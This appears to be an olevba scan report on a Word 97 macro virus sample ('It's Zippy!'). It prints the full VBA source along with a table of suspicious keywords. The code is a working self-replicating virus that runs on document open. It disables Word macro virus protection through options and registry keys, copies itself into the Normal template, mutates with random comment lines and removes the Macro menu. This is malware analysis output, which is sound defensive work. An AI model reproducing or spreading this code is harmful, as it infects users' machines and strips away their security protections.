olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.aw-9a0ea2a8ed3e2f3de2bbf45b76d4f7b94a572943
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.aw-9a0ea2a8ed3e2f3de2bbf45b76d4f7b94a572943 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo ldr
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): vx = 1: xv = 4: x = 0: z = 0: y = 0
xrt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
'132549149329436045394895.77974461614974E+211325491493294360453948913254914932943604539489
xst = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
If xst > Sgn(x) And xrt > Sgn(x) Then GoTo ldr
If xst = Sgn(x) Then
    Set czy = NormalTemplate.VBProject.VBComponents
'90333909136131606784001.18885552675372E+2190333909136131606784009033390913613160678400
    Set hst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) > 1 And Day(Now()) = 15 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
    hst.Item(Cos(Atn(CInt(1)))).Name = czy.Item(Cos(Atn(CInt(1)))).Name
    hst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
'25812599569911635364892.35316786268448E+2125812599569911635364892581259956991163536489
End If
If xrt = Sgn(x) Then Set czy = ActiveDocument.VBProject.VBComponents
czy.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
With czy.Item(Cos(Atn(CInt(1)))).codemodule
'241771401879264825762.12581088774016E+192417714018792648257624177140187926482576
    For j = Abs(vx) To Abs(xv)
    .deletelines Abs(vx)
        Next j
End With
'175543402441764964964001.34284552528717E+221755434024417649649640017554340244176496496400
With czy.Item(Cos(Atn(CInt(1)))).codemodule
For j = Chr(53) To 40 Step Chr(53)
    y = Int(Rnd(412835) * 503989) + 8485: z = Int(Rnd(684958) * 385865) + 2988
    .replaceline j, Chr(39) & y * y & z * z & y * y * z * z & y * y & z * z & y * y & z * z
'982320964264869115042.6018648441992E+199823209642648691150498232096426486911504
     Next j
End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
'196457265225948676960361.86374481214291E+221964572652259486769603619645726522594867696036
If xst = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete
If xst = Sgn(x) Then czy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(vx), "Sub AutoClose()"
If xst = Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ldr:
'387078080491400046855845.41927449554607E+213870780804914000468558438707808049140004685584
If xst <> Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/It's Zippy! by Virus :) Smile
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

